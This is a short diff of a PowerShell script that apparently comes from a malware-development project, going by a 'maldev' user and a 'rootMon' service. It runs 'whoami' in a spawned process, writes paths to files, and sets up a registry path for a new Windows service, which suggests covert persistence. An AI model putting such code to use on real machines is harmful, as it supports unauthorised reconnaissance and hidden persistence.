@@ -10,8 +10,8 @@ $paths = @(
     "$env:windir\System32\LogFiles\WMI"
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
-echo $basePath >> "C:\Users\$env:username\Downloads\path.txt"
-echo `"$basePath`" >> "C:\Users\$env:username\Downloads\path.txt"
+echo $basePath >> "C:\Users\maldev\Downloads\path.txt"
+echo `"$basePath`" >> "C:\Users\maldev\Downloads\path.txt"
 $serviceName = "MyRootMonService"
 $propertyName = "rootMon"
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
